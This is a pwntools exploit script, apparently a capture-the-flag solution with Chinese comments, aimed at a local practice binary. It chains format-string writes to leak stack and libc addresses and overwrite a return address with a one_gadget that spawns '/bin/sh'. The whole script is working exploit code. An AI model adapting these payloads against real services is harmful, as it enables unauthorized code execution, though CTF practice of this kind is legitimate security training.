from pwn import *
from LibcSearcher import *

# 配置
context(os='linux', arch='amd64', log_level='debug')
binary = "./pwn"

# 远程/本地切换
if args.get("REMOTE"):
    io = remote("127.0.0.1", 8080)
else:
    io = process(binary)

# ELF加载
elf = ELF(binary)
libc = ELF("/home/source/tools/glibc-all-in-one//libs/2.23-0ubuntu3_amd64/libc.so.6")

# ========== 常用函数定义 ==========
s       = lambda data               : io.send(data)
sa      = lambda delim, data        : io.sendafter(str(delim), data)
sl      = lambda data               : io.sendline(data)
sla     = lambda delim, data        : io.sendlineafter(str(delim), data)
r       = lambda num=4096           : io.recv(num)
rl      = lambda                    : io.recvline()
ru      = lambda delims, drop=False : io.recvuntil(delims, drop)
itr     = lambda                    : io.interactive()
uu32    = lambda data               : u32(data.ljust(4, b'\x00'))
uu64    = lambda data               : u64(data.ljust(8, b'\x00'))
leak    = lambda name, addr         : log.success('{} ======== > {:#x}'.format(name, addr))
p       = lambda name,data          : print("{} ======== > {}".format(name,data))

# ========== 常用泄露函数 ==========
l64     = lambda                    : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
l32     = lambda                    : u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b"\x00"))
l64_no  = lambda                    : u64(io.recv(6).ljust(8, b'\x00'))
def bug():
  gdb.attach(io)
  pause()
# ========== Exploit 开始 ==========
def exp():
    ru("your gift ")
    stack = int(r(14),16)
    leak("stack",stack)
    
    offset = 6 
    pay = b'%4669c%11$hn'+b'%19$p'
    pay = pay.ljust(0x28,b'a')
    pay += p64(stack-8)
    
    sa("please tell me your name",pay)

    ru(b"0x")
    libc_base = int(r(12).strip(),16)-0x20830
    ogg = libc_base+0xf0897
    leak("libc_base",libc_base)
    leak("ogg",ogg)
    
    pay = b'%'+str((ogg&0xffffff)>>16).encode()+b'c%10$hhn'
    pay += b'%'+str((ogg&0xffff)-((ogg&0xffffff)>>16)).encode()+b'c%11$hn'
    pay = pay.ljust(0x20,b'a')
    pay += p64(stack+0x68+0x2)
    pay += p64(stack+0x68)
    
    sleep(2)
    s(pay)
    bug()
exp()
itr()

"""
0x4525a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xef9f4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

0xf0897 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
"""
